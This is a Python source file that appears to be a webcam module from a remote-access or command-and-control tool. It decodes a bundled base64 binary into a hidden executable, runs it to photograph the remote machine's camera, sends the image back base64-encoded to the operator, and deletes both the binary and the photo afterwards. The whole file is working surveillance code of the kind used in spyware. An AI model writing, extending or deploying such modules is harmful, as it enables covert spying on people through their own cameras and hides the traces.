import os
import base64
# from PIL import Image
from apps.server.modules.libs.mod_interfaceRunCmd import mod_interfaceRunCmd

OUTPUT_PATH = "/tmp"


class mod_webcam(mod_interfaceRunCmd):

    cmd_short = "wc"
    cmd_long = "webcam"
    cmd_desc = "Webcam module"

    def setup_mod(self):
        print(f'Module Setup (mod_webcam) called successfully!')
        pass

    def run_mod(self, cmd="", param=""):
        # print(f'Webcam Module')
        filename_path = ""
        if param != "":
            args = param.split(" ")
            if len(args) >= 2:
                if args[0] == "-f":
                    filename_path = args[1]

        content_encoding = "utf-8"
        cur_dir = os.path.abspath("")
        # print(f'{cur_dir}')
        base64ToolFile = open(f'{cur_dir}/res/tools/wc_tool', 'rb')
        base64ToolContent = base64ToolFile.read()

        wc_tool_bin = f"{cur_dir}/res/tools/.wc_tool_bin"
        wc_img = f"{OUTPUT_PATH}/wc_tmp.png"
        with open(wc_tool_bin, "wb") as output_file:
            output_file.write(base64.b64decode(base64ToolContent))
            self.run_command(f"chmod a+x {wc_tool_bin}")

        print(self.run_command(f'{wc_tool_bin} {wc_img}'))

        image = open(f'{wc_img}', 'rb')
        image_read = image.read()
        image_64_encode = base64.encodebytes(image_read)
        answer = "Photo (webcam) taken"
        # with Image.open(wc_img) as img:
        #     img.show()
        # print(answer)
        os.remove(wc_tool_bin)
        os.remove(wc_img)
        return {'img': image_64_encode.decode("utf-8"), 'filename_path': filename_path}

    def mod_helptxt(self):
        help_txt = {
            'desc': self.pritify4log("The 'Webcam' module takes snapshot with the webcam of the\n"
                                     "server. The green LED will turn on as this cannot be omitted.\n"
                                     "Default the image will be saved it in the '/tmp' folder on the\n"
                                     "client as well as opens it in the default image preview app on\n"
                                     "the client. You can also specify a alternative filename with\n"
                                     "the '-f <filename>' param to override the default save location."),
            'cmd': f'{self.getCmdVariants4Help()} [-f <local filename / -path>]',
            'ext': self.pritify4log(
                   '-f\tSpecify file-path / -name for saving the retrieved image.\n\n'
                   f'Default save location is {OUTPUT_PATH} (app-dir) and the image filename\n'
                   f'will be padded with a timestamp. You will get the filename / path \n'
                   f'displayed when the module returns.')
        }
        return help_txt
